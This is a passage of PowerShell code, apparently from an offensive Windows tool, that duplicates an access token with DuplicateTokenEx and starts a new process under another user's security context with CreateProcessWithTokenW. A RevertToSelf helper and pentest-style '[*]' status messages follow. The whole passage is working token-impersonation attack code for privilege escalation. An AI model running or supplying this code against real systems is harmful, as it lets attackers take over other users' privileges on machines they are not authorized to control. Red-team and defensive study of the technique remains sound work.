    [IntPtr]$TokenAttributes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($NEW_SECURITY_ATTRIBUTES_Struct, $TokenAttributes, $False)
    $ImpersonationLevel = $SECURITY_IMPERSONATION_LEVEL::'SecurityImpersonation'
    $TokenType = $TOKEN_TYPE::'TokenPrimary'
    $NewTokenHandle = [IntPtr]::Zero

    # DuplicateTokenEx - Create a new access token that duplicates an existing token
    $Result = $Advapi32::DuplicateTokenEx($CurrentThreadTokenHandle, $DesiredAccess, $TokenAttributes, $ImpersonationLevel, $TokenType, [ref]$NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0)
    {
        throw    "DuplicateTokenEx Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Duplicated token"
    }

    # CreateProcessWithTokenW Parameters
    $STARTUP_INFO_STRUCT = [Activator]::CreateInstance($STARTUPINFO)
    $STARTUP_INFO_STRUCT.dwFlags = 0x00000001 
    $STARTUP_INFO_STRUCT.wShowWindow = 0x0001
    $STARTUP_INFO_STRUCT.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUP_INFO_STRUCT)
    [IntPtr]$STARTUP_INFO_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($STARTUP_INFO_STRUCT,$STARTUP_INFO_PTR,$false)
    $PROCESS_INFORMATION_STRUCT = [Activator]::CreateInstance($PROCESS_INFORMATION)
    [IntPtr]$PROCESS_INFORMATION_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($PROCESS_INFORMATION_STRUCT,$PROCESS_INFORMATION_PTR,$false)

    $path = "C:\Windows\System32"

    # CreateProcessWithTokenW - Impersonate the security context of a logged-on user
    $Result = $Advapi32::CreateProcessWithTokenW($NewTokenHandle, 0x00000002, $ApplicationName, $CommandLine, 0x04000000, $null, $path, $STARTUP_INFO_PTR, [ref]$PROCESS_INFORMATION_PTR); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0)
    {
        throw "CreateProcessWithTokenW Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Created a new process and its primary thread in the security context of the specified token"
        Write-Host "$CommandLine`n"
    }
}

function RevertToSelf
{
    $Result = $Advapi32::RevertToSelf(); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
    if($Result -eq 0)
    {
        throw "RevertToSelf Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Terminated the impersonation of a client application"
    }
}